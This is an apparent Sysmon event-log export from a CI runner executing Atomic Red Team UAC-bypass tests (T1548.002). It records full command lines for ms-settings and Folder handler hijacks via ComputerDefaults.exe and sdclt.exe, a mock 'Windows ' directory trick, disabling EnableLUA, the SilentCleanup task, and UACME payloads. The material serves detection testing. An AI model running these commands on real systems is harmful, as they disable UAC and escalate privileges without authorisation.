"12/17/2025 8:03:24 AM","10","Process accessed:
RuleName: ProcessAccess
UtcTime: 2025-12-17 08:03:24.746
SourceProcessGUID: {f995aebf-60f0-6942-4d02-000000000e00}
SourceProcessId: 7600
SourceThreadId: 6580
SourceImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE
TargetProcessGUID: {f995aebf-63cc-6942-7305-000000000e00}
TargetProcessId: 6680
TargetImage: C:\Windows\SYSTEM32\cmd.exe
GrantedAccess: 0x1FFFFF
CallTrace: C:\Windows\SYSTEM32\ntdll.dll+1636d4|C:\Windows\System32\KERNELBASE.dll+96a8a|C:\Windows\System32\KERNELBASE.dll+940e6|C:\Windows\System32\KERNEL32.DLL+3c6d4|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\22f4d83e48c2201947e262d4bca638b9\System.ni.dll+351876|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\22f4d83e48c2201947e262d4bca638b9\System.ni.dll+2b3c89|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\22f4d83e48c2201947e262d4bca638b9\System.ni.dll+2b35f9|UNKNOWN(00007FF991FCB485)
SourceUser: runnervm8j6r3\runneradmin
TargetUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:03:24 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:03:24.746
ProcessGuid: {f995aebf-63cc-6942-7305-000000000e00}
ProcessId: 6680
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: ""cmd.exe"" /c ""C:\AtomicRedTeam\atomics\..\ExternalPayloads\uacme\31 Akagi64.exe""
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-600e-6942-ddf0-0b0000000000}
LogonId: 0xBF0DD
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=9695CF4566DDF878A69C3D419E0DA4EEA87B0F24261AD8E79A3A9C4A9885429C
ParentProcessGuid: {f995aebf-60f0-6942-4d02-000000000e00}
ParentProcessId: 7600
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\b5779890-c6d1-4d54-8cf1-6a4ae2edeb5c.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:03:24 AM","10","Process accessed:
RuleName: ProcessAccess
UtcTime: 2025-12-17 08:03:24.502
SourceProcessGUID: {f995aebf-60f0-6942-4d02-000000000e00}
SourceProcessId: 7600
SourceThreadId: 6580
SourceImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE
TargetProcessGUID: {f995aebf-63cc-6942-7105-000000000e00}
TargetProcessId: 3388
TargetImage: C:\Windows\SYSTEM32\cmd.exe
GrantedAccess: 0x1FFFFF
CallTrace: C:\Windows\SYSTEM32\ntdll.dll+1636d4|C:\Windows\System32\KERNELBASE.dll+96a8a|C:\Windows\System32\KERNELBASE.dll+940e6|C:\Windows\System32\KERNEL32.DLL+3c6d4|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\22f4d83e48c2201947e262d4bca638b9\System.ni.dll+351876|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\22f4d83e48c2201947e262d4bca638b9\System.ni.dll+2b3c89|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\22f4d83e48c2201947e262d4bca638b9\System.ni.dll+2b35f9|UNKNOWN(00007FF991FCB485)
SourceUser: runnervm8j6r3\runneradmin
TargetUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:03:24 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:03:24.501
ProcessGuid: {f995aebf-63cc-6942-7105-000000000e00}
ProcessId: 3388
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: ""cmd.exe"" /c ""C:\AtomicRedTeam\atomics\..\ExternalPayloads\uacme\23 Akagi64.exe""
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-600e-6942-ddf0-0b0000000000}
LogonId: 0xBF0DD
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=9695CF4566DDF878A69C3D419E0DA4EEA87B0F24261AD8E79A3A9C4A9885429C
ParentProcessGuid: {f995aebf-60f0-6942-4d02-000000000e00}
ParentProcessId: 7600
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\b5779890-c6d1-4d54-8cf1-6a4ae2edeb5c.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:03:24 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:03:24.222
ProcessGuid: {f995aebf-63cc-6942-6e05-000000000e00}
ProcessId: 9164
Image: C:\Windows\System32\schtasks.exe
FileVersion: 10.0.26100.6725 (WinBuild.160101.0800)
Description: Task Scheduler Configuration Tool
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: schtasks.exe
CommandLine: schtasks  /run /tn \Microsoft\Windows\DiskCleanup\SilentCleanup /I 
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-600e-6942-ddf0-0b0000000000}
LogonId: 0xBF0DD
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=B96AF3066F0B9DE8A460F77BAAE006C5372A266BE18C561DAA7C7AE8635D399D
ParentProcessGuid: {f995aebf-63cb-6942-6905-000000000e00}
ParentProcessId: 6128
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: ""cmd.exe"" /c ""C:\AtomicRedTeam\atomics\T1548.002\src\T1548.002.bat""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:03:23 AM","10","Process accessed:
RuleName: ProcessAccess
UtcTime: 2025-12-17 08:03:23.033
SourceProcessGUID: {f995aebf-60f0-6942-4d02-000000000e00}
SourceProcessId: 7600
SourceThreadId: 6580
SourceImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE
TargetProcessGUID: {f995aebf-63cb-6942-6905-000000000e00}
TargetProcessId: 6128
TargetImage: C:\Windows\SYSTEM32\cmd.exe
GrantedAccess: 0x1FFFFF
CallTrace: C:\Windows\SYSTEM32\ntdll.dll+1636d4|C:\Windows\System32\KERNELBASE.dll+96a8a|C:\Windows\System32\KERNELBASE.dll+940e6|C:\Windows\System32\KERNEL32.DLL+3c6d4|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\22f4d83e48c2201947e262d4bca638b9\System.ni.dll+351876|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\22f4d83e48c2201947e262d4bca638b9\System.ni.dll+2b3c89|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\22f4d83e48c2201947e262d4bca638b9\System.ni.dll+2b35f9|UNKNOWN(00007FF991FCB485)
SourceUser: runnervm8j6r3\runneradmin
TargetUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:03:23 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:03:23.034
ProcessGuid: {f995aebf-63cb-6942-6905-000000000e00}
ProcessId: 6128
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: ""cmd.exe"" /c ""C:\AtomicRedTeam\atomics\T1548.002\src\T1548.002.bat""
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-600e-6942-ddf0-0b0000000000}
LogonId: 0xBF0DD
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=9695CF4566DDF878A69C3D419E0DA4EEA87B0F24261AD8E79A3A9C4A9885429C
ParentProcessGuid: {f995aebf-60f0-6942-4d02-000000000e00}
ParentProcessId: 7600
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\b5779890-c6d1-4d54-8cf1-6a4ae2edeb5c.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:03:22 AM","13","Registry value set:
RuleName: T1548.002
EventType: SetValue
UtcTime: 2025-12-17 08:03:22.798
ProcessGuid: {f995aebf-63ca-6942-6805-000000000e00}
ProcessId: 9488
Image: C:\Windows\system32\reg.exe
TargetObject: HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA
Details: DWORD (0x00000000)
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:03:22 AM","10","Process accessed:
RuleName: ProcessAccess
UtcTime: 2025-12-17 08:03:22.769
SourceProcessGUID: {f995aebf-60f0-6942-4d02-000000000e00}
SourceProcessId: 7600
SourceThreadId: 6580
SourceImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE
TargetProcessGUID: {f995aebf-63ca-6942-6605-000000000e00}
TargetProcessId: 4332
TargetImage: C:\Windows\SYSTEM32\cmd.exe
GrantedAccess: 0x1FFFFF
CallTrace: C:\Windows\SYSTEM32\ntdll.dll+1636d4|C:\Windows\System32\KERNELBASE.dll+96a8a|C:\Windows\System32\KERNELBASE.dll+940e6|C:\Windows\System32\KERNEL32.DLL+3c6d4|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\22f4d83e48c2201947e262d4bca638b9\System.ni.dll+351876|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\22f4d83e48c2201947e262d4bca638b9\System.ni.dll+2b3c89|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\22f4d83e48c2201947e262d4bca638b9\System.ni.dll+2b35f9|UNKNOWN(00007FF991FCB485)
SourceUser: runnervm8j6r3\runneradmin
TargetUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:03:22 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:03:22.769
ProcessGuid: {f995aebf-63ca-6942-6605-000000000e00}
ProcessId: 4332
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: ""cmd.exe"" /c reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-600e-6942-ddf0-0b0000000000}
LogonId: 0xBF0DD
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=9695CF4566DDF878A69C3D419E0DA4EEA87B0F24261AD8E79A3A9C4A9885429C
ParentProcessGuid: {f995aebf-60f0-6942-4d02-000000000e00}
ParentProcessId: 7600
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\b5779890-c6d1-4d54-8cf1-6a4ae2edeb5c.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:03:19 AM","13","Registry value set:
RuleName: T1546.001
EventType: SetValue
UtcTime: 2025-12-17 08:03:19.448
ProcessGuid: {f995aebf-63c6-6942-6405-000000000e00}
ProcessId: 9284
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetObject: HKU\S-1-5-21-3430515368-916141482-256631409-500_Classes\Folder\shell\open\command\DelegateExecute
Details: (Empty)
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:03:19 AM","13","Registry value set:
RuleName: T1546.001
EventType: SetValue
UtcTime: 2025-12-17 08:03:19.294
ProcessGuid: {f995aebf-63c6-6942-6405-000000000e00}
ProcessId: 9284
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetObject: HKU\S-1-5-21-3430515368-916141482-256631409-500_Classes\Folder\shell\open\command\(Default)
Details: cmd.exe /c notepad.exe
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:03:19 AM","12","Registry object added or deleted:
RuleName: RegistryEvent
EventType: CreateKey
UtcTime: 2025-12-17 08:03:19.293
ProcessGuid: {f995aebf-63c6-6942-6405-000000000e00}
ProcessId: 9284
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetObject: HKU\S-1-5-21-3430515368-916141482-256631409-500_Classes\Folder\shell\open\command
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:03:19 AM","12","Registry object added or deleted:
RuleName: RegistryEvent
EventType: CreateKey
UtcTime: 2025-12-17 08:03:19.293
ProcessGuid: {f995aebf-63c6-6942-6405-000000000e00}
ProcessId: 9284
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetObject: HKU\S-1-5-21-3430515368-916141482-256631409-500_Classes\Folder\shell\open
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:03:19 AM","12","Registry object added or deleted:
RuleName: RegistryEvent
EventType: CreateKey
UtcTime: 2025-12-17 08:03:19.293
ProcessGuid: {f995aebf-63c6-6942-6405-000000000e00}
ProcessId: 9284
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetObject: HKU\S-1-5-21-3430515368-916141482-256631409-500_Classes\Folder\shell
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:03:18 AM","10","Process accessed:
RuleName: ProcessAccess
UtcTime: 2025-12-17 08:03:18.965
SourceProcessGUID: {f995aebf-60f0-6942-4d02-000000000e00}
SourceProcessId: 7600
SourceThreadId: 6580
SourceImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE
TargetProcessGUID: {f995aebf-63c6-6942-6405-000000000e00}
TargetProcessId: 9284
TargetImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
GrantedAccess: 0x1FFFFF
CallTrace: C:\Windows\SYSTEM32\ntdll.dll+1636d4|C:\Windows\System32\KERNELBASE.dll+96a8a|C:\Windows\System32\KERNELBASE.dll+940e6|C:\Windows\System32\KERNEL32.DLL+3c6d4|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\22f4d83e48c2201947e262d4bca638b9\System.ni.dll+351876|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\22f4d83e48c2201947e262d4bca638b9\System.ni.dll+2b3c89|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\22f4d83e48c2201947e262d4bca638b9\System.ni.dll+2b35f9|UNKNOWN(00007FF991FCB485)
SourceUser: runnervm8j6r3\runneradmin
TargetUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:03:18 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:03:18.965
ProcessGuid: {f995aebf-63c6-6942-6405-000000000e00}
ProcessId: 9284
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.26100.5074 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: ""powershell.exe"" & {New-Item -Force -Path \""""HKCU:\Software\Classes\Folder\shell\open\command\"""" -Value 'cmd.exe /c notepad.exe'
New-ItemProperty -Force -Path \""""HKCU:\Software\Classes\Folder\shell\open\command\"""" -Name \""""DelegateExecute\""""
Start-Process -FilePath $env:windir\system32\sdclt.exe
Start-Sleep -s 3}
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-600e-6942-ddf0-0b0000000000}
LogonId: 0xBF0DD
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=0FF6F2C94BC7E2833A5F7E16DE1622E5DBA70396F31C7D5F56381870317E8C46
ParentProcessGuid: {f995aebf-60f0-6942-4d02-000000000e00}
ParentProcessId: 7600
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\b5779890-c6d1-4d54-8cf1-6a4ae2edeb5c.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:03:18 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:03:18.619
ProcessGuid: {f995aebf-63c6-6942-6205-000000000e00}
ProcessId: 2268
Image: C:\Windows\SYSTEM32\cmd.exe
TargetFilename: C:\testbypass.exe
CreationUtcTime: 2025-12-17 08:03:18.616
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:03:18 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:03:18.609
ProcessGuid: {f995aebf-63c6-6942-6205-000000000e00}
ProcessId: 2268
Image: C:\Windows\SYSTEM32\cmd.exe
TargetFilename: C:\Windows \System32\mmc.exe
CreationUtcTime: 2025-12-17 08:03:18.609
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:03:18 AM","7","Image loaded:
RuleName: ImageLoad
UtcTime: 2025-12-17 08:03:18.587
ProcessGuid: {f995aebf-63c6-6942-6105-000000000e00}
ProcessId: 7864
Image: C:\Program Files\WindowsApps\Microsoft.WindowsTerminal_1.18.10301.0_x64__8wekyb3d8bbwe\WindowsTerminal.exe
ImageLoaded: C:\ProgramData\Microsoft\VisualStudio\Setup\x64\Microsoft.VisualStudio.Setup.Configuration.Native.dll
FileVersion: 3.12.2140.44225
Description: Configuration for Visual Studio Setup
Product: Visual Studio
Company: Microsoft Corporation
OriginalFileName: Microsoft.VisualStudio.Setup.Configuration.Native.dll
Hashes: SHA256=2D64E8F75E487211367CE99D49171695D9CDD47D855F27B920FCFFDE422F3A58
Signed: true
Signature: Microsoft Corporation
SignatureStatus: Valid
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:03:18 AM","10","Process accessed:
RuleName: ProcessAccess
UtcTime: 2025-12-17 08:03:18.582
SourceProcessGUID: {f995aebf-60f0-6942-4d02-000000000e00}
SourceProcessId: 7600
SourceThreadId: 6580
SourceImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE
TargetProcessGUID: {f995aebf-63c6-6942-6205-000000000e00}
TargetProcessId: 2268
TargetImage: C:\Windows\SYSTEM32\cmd.exe
GrantedAccess: 0x1FFFFF
CallTrace: C:\Windows\SYSTEM32\ntdll.dll+1636d4|C:\Windows\System32\KERNELBASE.dll+96a8a|C:\Windows\System32\KERNELBASE.dll+940e6|C:\Windows\System32\KERNEL32.DLL+3c6d4|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\22f4d83e48c2201947e262d4bca638b9\System.ni.dll+351876|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\22f4d83e48c2201947e262d4bca638b9\System.ni.dll+2b3c89|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\22f4d83e48c2201947e262d4bca638b9\System.ni.dll+2b35f9|UNKNOWN(00007FF991FCB485)
SourceUser: runnervm8j6r3\runneradmin
TargetUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:03:18 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:03:18.582
ProcessGuid: {f995aebf-63c6-6942-6205-000000000e00}
ProcessId: 2268
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: ""cmd.exe"" /c mkdir ""\\?\C:\Windows \System32\"" & copy ""C:\Windows\System32\cmd.exe"" ""\\?\C:\Windows \System32\mmc.exe"" & mklink c:\testbypass.exe ""\\?\C:\Windows \System32\mmc.exe""
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-600e-6942-ddf0-0b0000000000}
LogonId: 0xBF0DD
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=9695CF4566DDF878A69C3D419E0DA4EEA87B0F24261AD8E79A3A9C4A9885429C
ParentProcessGuid: {f995aebf-60f0-6942-4d02-000000000e00}
ParentProcessId: 7600
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\b5779890-c6d1-4d54-8cf1-6a4ae2edeb5c.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:03:18 AM","7","Image loaded:
RuleName: ImageLoad
UtcTime: 2025-12-17 08:03:18.405
ProcessGuid: {f995aebf-63c6-6942-5f05-000000000e00}
ProcessId: 8912
Image: C:\Windows\System32\conhost.exe
ImageLoaded: C:\ProgramData\Microsoft\Windows\AppRepository\Packages\Microsoft.WindowsTerminal_1.18.10301.0_x64__8wekyb3d8bbwe\PackagedCom\OpenConsoleProxy.dll
FileVersion: -
Description: -
Product: -
Company: -
OriginalFileName: -
Hashes: SHA256=D8EF36FC593530AD64DBEE74BC4D384D9413F235A4D34826A475A982DD79F54C
Signed: true
Signature: Microsoft Corporation
SignatureStatus: Valid
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:03:18 AM","7","Image loaded:
RuleName: ImageLoad
UtcTime: 2025-12-17 08:03:18.402
ProcessGuid: {f995aebf-63c6-6942-6005-000000000e00}
ProcessId: 1552
Image: C:\Program Files\WindowsApps\Microsoft.WindowsTerminal_1.18.10301.0_x64__8wekyb3d8bbwe\OpenConsole.exe
ImageLoaded: C:\ProgramData\Microsoft\Windows\AppRepository\Packages\Microsoft.WindowsTerminal_1.18.10301.0_x64__8wekyb3d8bbwe\PackagedCom\OpenConsoleProxy.dll
FileVersion: -
Description: -
Product: -
Company: -
OriginalFileName: -
Hashes: SHA256=D8EF36FC593530AD64DBEE74BC4D384D9413F235A4D34826A475A982DD79F54C
Signed: true
Signature: Microsoft Corporation
SignatureStatus: Valid
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:03:18 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:03:18.314
ProcessGuid: {f995aebf-63c6-6942-5e05-000000000e00}
ProcessId: 6484
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: ""C:\Windows\System32\cmd.exe"" 
CurrentDirectory: C:\Users\runneradmin\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-600e-6942-ddf0-0b0000000000}
LogonId: 0xBF0DD
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=9695CF4566DDF878A69C3D419E0DA4EEA87B0F24261AD8E79A3A9C4A9885429C
ParentProcessGuid: {f995aebf-63c6-6942-5d05-000000000e00}
ParentProcessId: 9532
ParentImage: C:\Windows\System32\ComputerDefaults.exe
ParentCommandLine: ""C:\Windows\System32\ComputerDefaults.exe"" 
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:03:18 AM","13","Registry value set:
RuleName: T1546.001
EventType: SetValue
UtcTime: 2025-12-17 08:03:18.181
ProcessGuid: {f995aebf-63c5-6942-5b05-000000000e00}
ProcessId: 2292
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetObject: HKU\S-1-5-21-3430515368-916141482-256631409-500_Classes\ms-settings\shell\open\command\(Default)
Details: C:\Windows\System32\cmd.exe
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:03:18 AM","13","Registry value set:
RuleName: T1546.001
EventType: SetValue
UtcTime: 2025-12-17 08:03:18.171
ProcessGuid: {f995aebf-63c5-6942-5b05-000000000e00}
ProcessId: 2292
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetObject: HKU\S-1-5-21-3430515368-916141482-256631409-500_Classes\ms-settings\shell\open\command\DelegateExecute
Details: (Empty)
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:03:17 AM","7","Image loaded:
RuleName: ImageLoad
UtcTime: 2025-12-17 08:03:17.612
ProcessGuid: {f995aebf-63c5-6942-5a05-000000000e00}
ProcessId: 6512
Image: C:\Program Files\WindowsApps\Microsoft.WindowsTerminal_1.18.10301.0_x64__8wekyb3d8bbwe\WindowsTerminal.exe
ImageLoaded: C:\ProgramData\Microsoft\VisualStudio\Setup\x64\Microsoft.VisualStudio.Setup.Configuration.Native.dll
FileVersion: 3.12.2140.44225
Description: Configuration for Visual Studio Setup
Product: Visual Studio
Company: Microsoft Corporation
OriginalFileName: Microsoft.VisualStudio.Setup.Configuration.Native.dll
Hashes: SHA256=2D64E8F75E487211367CE99D49171695D9CDD47D855F27B920FCFFDE422F3A58
Signed: true
Signature: Microsoft Corporation
SignatureStatus: Valid
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:03:17 AM","10","Process accessed:
RuleName: ProcessAccess
UtcTime: 2025-12-17 08:03:17.598
SourceProcessGUID: {f995aebf-60f0-6942-4d02-000000000e00}
SourceProcessId: 7600
SourceThreadId: 6580
SourceImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE
TargetProcessGUID: {f995aebf-63c5-6942-5b05-000000000e00}
TargetProcessId: 2292
TargetImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
GrantedAccess: 0x1FFFFF
CallTrace: C:\Windows\SYSTEM32\ntdll.dll+1636d4|C:\Windows\System32\KERNELBASE.dll+96a8a|C:\Windows\System32\KERNELBASE.dll+940e6|C:\Windows\System32\KERNEL32.DLL+3c6d4|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\22f4d83e48c2201947e262d4bca638b9\System.ni.dll+351876|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\22f4d83e48c2201947e262d4bca638b9\System.ni.dll+2b3c89|C:\Windows\assembly\NativeImages_v4.0.30319_64\System\22f4d83e48c2201947e262d4bca638b9\System.ni.dll+2b35f9|UNKNOWN(00007FF991FCB485)
SourceUser: runnervm8j6r3\runneradmin
TargetUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:03:17 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:03:17.597
ProcessGuid: {f995aebf-63c5-6942-5b05-000000000e00}
ProcessId: 2292
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.26100.5074 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: ""powershell.exe"" & {New-Item \""""HKCU:\software\classes\ms-settings\shell\open\command\"""" -Force
New-ItemProperty \""""HKCU:\software\classes\ms-settings\shell\open\command\"""" -Name \""""DelegateExecute\"""" -Value \""""\"""" -Force
Set-ItemProperty \""""HKCU:\software\classes\ms-settings\shell\open\command\"""" -Name \""""(default)\"""" -Value \""""C:\Windows\System32\cmd.exe\"""" -Force
Start-Process \""""C:\Windows\System32\ComputerDefaults.exe\""""}
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-600e-6942-ddf0-0b0000000000}
LogonId: 0xBF0DD
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=0FF6F2C94BC7E2833A5F7E16DE1622E5DBA70396F31C7D5F56381870317E8C46
ParentProcessGuid: {f995aebf-60f0-6942-4d02-000000000e00}
ParentProcessId: 7600
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\b5779890-c6d1-4d54-8cf1-6a4ae2edeb5c.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:03:17 AM","7","Image loaded:
RuleName: ImageLoad
UtcTime: 2025-12-17 08:03:17.433
ProcessGuid: {f995aebf-63c5-6942-5805-000000000e00}
ProcessId: 8516
Image: C:\Windows\System32\conhost.exe
ImageLoaded: C:\ProgramData\Microsoft\Windows\AppRepository\Packages\Microsoft.WindowsTerminal_1.18.10301.0_x64__8wekyb3d8bbwe\PackagedCom\OpenConsoleProxy.dll
FileVersion: -
Description: -
Product: -
Company: -
OriginalFileName: -
Hashes: SHA256=D8EF36FC593530AD64DBEE74BC4D384D9413F235A4D34826A475A982DD79F54C
Signed: true
Signature: Microsoft Corporation
SignatureStatus: Valid
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:03:17 AM","7","Image loaded:
RuleName: ImageLoad
UtcTime: 2025-12-17 08:03:17.431
ProcessGuid: {f995aebf-63c5-6942-5905-000000000e00}
ProcessId: 6268
Image: C:\Program Files\WindowsApps\Microsoft.WindowsTerminal_1.18.10301.0_x64__8wekyb3d8bbwe\OpenConsole.exe
ImageLoaded: C:\ProgramData\Microsoft\Windows\AppRepository\Packages\Microsoft.WindowsTerminal_1.18.10301.0_x64__8wekyb3d8bbwe\PackagedCom\OpenConsoleProxy.dll
FileVersion: -
Description: -
Product: -
Company: -
OriginalFileName: -
